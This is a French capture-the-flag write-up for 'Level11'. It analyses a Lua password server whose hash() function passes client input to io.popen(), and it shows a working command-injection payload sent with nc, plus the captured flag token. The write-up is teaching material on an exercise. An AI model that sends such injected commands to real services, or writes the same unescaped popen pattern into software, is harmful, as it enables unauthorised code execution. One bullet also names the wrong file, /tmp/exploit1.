# Level11

## Démarche

1. **Reconnaissance**

   ```bash
   ps aux | grep level11
   flag11    1921  0.0  0.0   2896   952 ?        S    12:10   0:00 lua /home/user/level11/level11.lua
   ```

   Pas de binaire setuid ici : un script **Lua** tourne en tant que process
   `flag11` lui-même (donc toute exécution de commande dans ce process
   hérite directement des droits de `flag11`, sans contournement de
   permissions à trouver).

   ```bash
   strings ./level11.lua

   #!/usr/bin/env lua
   local socket = require("socket")
   local server = assert(socket.bind("127.0.0.1", 5151))

   function hash(pass)
     prog = io.popen("echo "..pass.." | sha1sum", "r")
     data = prog:read("*all")
     prog:close()
     data = string.sub(data, 1, 40)
     return data
    
   while 1 do
     local client = server:accept()
     client:send("Password: ")
     client:settimeout(60)
     local l, err = client:receive()
     if not err then
         print("trying " .. l)
         local h = hash(l)
         if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
             client:send("Erf nope..\n");
         else
             client:send("Gz you dumb*\n")
         end
     end
     client:close()
   ```

   Le serveur écoute en local sur le port **5151**, lit une ligne envoyée par
   le client, la passe à `hash()`, et compare le résultat à un hash SHA1
   fixe.

2. **Analyse**

   ```lua
   prog = io.popen("echo "..pass.." | sha1sum", "r")
   ```

   `..` est l'opérateur de **concaténation de chaînes** en Lua . `pass` est le paramètre de la fonction `hash()`,
   lui-même rempli par `l` , la ligne **entièrement contrôlée par le
   client**, lue via `client:receive()`.

   Cette ligne colle donc, sans aucun échappement ni validation, le contenu
   envoyé par le client au milieu d'une commande shell exécutée par
   `io.popen()` (qui invoque `/bin/sh -c "..."`).

3. **Faille / principe**

   C'est une **injection de commande OS** (*OS Command Injection*) : tout
   métacaractère shell (`;`, `|`, `` ` ``, `$()`, `#`...) envoyé dans le
   "mot de passe" est interprété par le shell plutôt que traité comme un
   simple argument de `echo`.

   Exemple avec le payload `; getflag > /tmp/exploit; chmod 644 /tmp/exploit #` :

   ```bash
   # commande réellement exécutée par io.popen() :
   echo ; getflag > /tmp/exploit; chmod 644 /tmp/exploit # | sha1sum
   ```

   - Le `;` initial **termine** la commande `echo` (vide) pour démarrer une
     **nouvelle commande indépendante** juste après , sans lui, le payload
     ne serait qu'un argument texte de `echo`, jamais exécuté.
   - `getflag > /tmp/exploit1` exécute `getflag` en tant que `flag11`
     et redirige sa sortie .
   - `chmod 644 /tmp/exploit` rend ce fichier lisible par tout le monde.
   - `#` commente le reste de la ligne (`| sha1sum`), qui n'a de toute façon
     aucune importance : le résultat de `hash()` n'est jamais renvoyé au
     client, seul un message `"Erf nope.."` / `"Gz you dumb*"` l'est , d'où
     la nécessité de faire fuiter le résultat via un fichier plutôt que via
     la réponse du socket.

4. **Contournement / implémentation**

   ```bash
   echo '; getflag > /tmp/exploit; chmod 644 /tmp/exploit #' | nc 127.0.0.1 5151
   Password: Erf nope..
   ```

   ```bash
   cat /tmp/exploit
   Check flag. Here is your token : fa6v5ateaw21peobuub8ipe6s
   ```
